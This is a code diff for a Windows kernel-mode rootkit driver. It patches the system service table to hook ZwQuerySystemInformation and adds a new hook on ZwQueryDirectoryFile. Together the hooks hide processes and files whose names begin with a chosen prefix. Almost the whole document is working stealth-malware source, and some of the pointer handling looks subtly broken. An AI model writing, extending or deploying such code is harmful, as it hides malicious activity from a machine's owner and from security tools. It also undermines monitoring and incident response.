@@ -1,7 +1,9 @@
 #include "common.h"
 #include "user_defined_types.h"
 #include "process_threads_structure.h"
+#include "query_directory_structs.h"
 #include "ssdt_structures.h"
+
 
 #ifndef PROCESS_START
 #error Error, you must define the variable PROCESS_START, with name of processes to hide
@@ -94,6 +96,19 @@ NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(
 	IN ULONG SystemInformationLength,
 	OUT PULONG ReturnLength);
 
+NTSYSAPI NTSTATUS NTAPI ZwQueryDirectoryFile(
+	IN     HANDLE                 FileHandle,
+	_In_opt_ HANDLE                 Event,
+	_In_opt_ PIO_APC_ROUTINE        ApcRoutine,
+	_In_opt_ PVOID                  ApcContext,
+	OUT    PIO_STATUS_BLOCK       IoStatusBlock,
+	OUT    PVOID                  FileInformation,
+	IN     ULONG                  Length,
+	IN     FILE_INFORMATION_CLASS FileInformationClass,
+	IN     BOOLEAN                ReturnSingleEntry,
+	_In_opt_ PUNICODE_STRING        FileName,
+	IN     BOOLEAN                RestartScan
+);
 
 /*
 * Tipo definido de función ZwQuerySystemInformation, lo usaremos
@@ -110,8 +125,23 @@ typedef NTSTATUS(*ZWQUERYSYSTEMINFORMATION)(
 	PULONG ReturnLength
 	);
 
-// puntero al anterior ZwQuerySystemInformation
+typedef NTSTATUS(*ZWQUERYDIRECTORYFILE)(
+	HANDLE                 FileHandle,
+	HANDLE                 Event,
+	PIO_APC_ROUTINE        ApcRoutine,
+	PVOID                  ApcContext,
+	PIO_STATUS_BLOCK       IoStatusBlock,
+	PVOID                  FileInformation,
+	ULONG                  Length,
+	FILE_INFORMATION_CLASS FileInformationClass,
+	BOOLEAN                ReturnSingleEntry,
+	PUNICODE_STRING        FileName,
+	BOOLEAN                RestartScan
+	);
+
+// pointers to old functions
 ZWQUERYSYSTEMINFORMATION        OldZwQuerySystemInformation;
+ZWQUERYDIRECTORYFILE			OldZwQueryDirectoryFile;
 
 LARGE_INTEGER					m_UserTime;
 LARGE_INTEGER					m_KernelTime;
@@ -120,15 +150,6 @@ LARGE_INTEGER					m_KernelTime;
 NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath);
 VOID Unload(IN PDRIVER_OBJECT DriverObject);
 
-/*
-* Función para filtrar el ZwQuerySystemInformation
-*
-* ZwQueryInformation() retorna una lista enlazada
-* de procesos
-* La función siguiente imita este comportamiento,
-* salvo que quita de la lista aquellos nombres
-* que empiezan por "__root__".
-*/
 /*
 *	Function for filtering ZwQuerySystemInformation
 *
@@ -242,6 +263,113 @@ NTSTATUS NewZwQuerySystemInformation(
 }
 
 /*
+*	Function for filtering ZwQueryDirectoryFile
+*
+*	As we have different structures depending on the
+*	alue of FileInformationClass, we will search the 
+*	name using the functions from query_directory_functions.c
+*/
+NTSTATUS newZwQueryDirectoryFile
+(
+	IN HANDLE FileHandle,
+	IN HANDLE Event,
+	IN PIO_APC_ROUTINE ApcRoutine,
+	IN PVOID ApcContext,
+	OUT PIO_STATUS_BLOCK IoStatusBlock,
+	OUT PVOID FileInformation,
+	IN ULONG Length,
+	IN FILE_INFORMATION_CLASS FileInformationClass,
+	IN BOOLEAN ReturnSingleEntry,
+	IN PUNICODE_STRING FileName,
+	IN BOOLEAN RestartScan
+)
+{
+	NTSTATUS		ntStatus;
+	PVOID			currFile;
+	PVOID			prevFile;
+	ULONG			delta, nBytes;
+
+	// call the real function to get the data
+	ntStatus = OldZwQueryDirectoryFile(
+		FileHandle,
+		Event,
+		ApcRoutine,
+		ApcContext,
+		IoStatusBlock,
+		FileInformation,
+		Length,
+		FileInformationClass,
+		ReturnSingleEntry,
+		FileName,
+		RestartScan
+	);
+
+	// if something was wrong
+	if (!NT_SUCCESS(ntStatus))
+	{
+		DbgPrint("%s\n", "Error calling ZwQueryDirectoryFile");
+		return ntStatus;
+	}
+
+	// check if FileInformationClass is any of those we want to check
+	switch (FileInformationClass)
+	{
+	case FileDirectoryInformation:
+	case FileFullDirectoryInformation:
+	case FileIdFullDirectoryInformation:
+	case FileBothDirectoryInformation:
+	case FileIdBothDirectoryInformation:
+	case FileNamesInformation:
+		currFile = FileInformation;
+		prevFile = NULL;
+
+		do
+		{
+			if (get_dir_entry_filename(FileInformation, FileInformationClass) != NULL)
+			{
+				if (memcmp(
+					get_dir_entry_filename(FileInformation, FileInformationClass),
+					PROCESS_START,
+					wcslen(PROCESS_START) * 2
+				) == 0)
+				{
+					// if there's more files after the file on the list
+					if (get_next_entry_offset(currFile, FileInformationClass) != NO_MORE_FILES)
+					{
+						delta = ((ULONG)currFile - (ULONG)FileInformation);
+						nBytes = (ULONG)Length - delta;
+						RtlCopyMemory((PVOID)currFile, (PVOID)((char*)currFile + get_next_entry_offset(currFile, FileInformationClass)), (DWORD32)nBytes);
+						continue;
+					}
+					// this is the last file on the list
+					else
+					{
+						if (currFile == FileInformation) // currFile is the only file
+						{
+							ntStatus = STATUS_NO_MORE_FILES;
+							FileInformation = NULL;
+							break;
+						}
+						else
+						{
+							// if our file is the last one
+							// we need to set the previous file 
+							// to the end
+							set_next_entry_offset(prevFile, FileInformationClass, NO_MORE_FILES);
+						}
+					}
+				}
+			}
+			prevFile = currFile;
+			currFile = ((char*)currFile + get_next_entry_offset(currFile, FileInformationClass));
+		} while (get_next_entry_offset(prevFile, FileInformationClass) != NO_MORE_FILES);
+	}
+
+	return ntStatus;
+}
+
+
+/*
 *	Function to unload the driver
 */
 VOID Unload(IN PDRIVER_OBJECT DriverObject)
@@ -255,6 +383,9 @@ VOID Unload(IN PDRIVER_OBJECT DriverObject)
 	UNHOOK_SYSCALL(ZwQuerySystemInformation,
 		OldZwQuerySystemInformation,
 		NewZwQuerySystemInformation);
+	UNHOOK_SYSCALL(ZwQueryDirectoryFile,
+		OldZwQueryDirectoryFile,
+		newZwQueryDirectoryFile);
 
 	// unblock and free the MDL
 	if (g_pmdlSystemCall)
@@ -283,7 +414,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING Registry
 
 	// Save pointer to previous call
 	OldZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation));
-
+	OldZwQueryDirectoryFile = (ZWQUERYDIRECTORYFILE)(SYSTEMSERVICE(ZwQueryDirectoryFile));
 	/*
 	*	Map the memory inside of our domain to change
 	*	memory permissions over MDL.
@@ -309,7 +440,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING Registry
 
 	// HOOK Syscall
 	HOOK_SYSCALL(ZwQuerySystemInformation, NewZwQuerySystemInformation, OldZwQuerySystemInformation);
-
+	HOOK_SYSCALL(ZwQueryDirectoryFile, newZwQueryDirectoryFile, OldZwQueryDirectoryFile);
 	return status;
 }
 
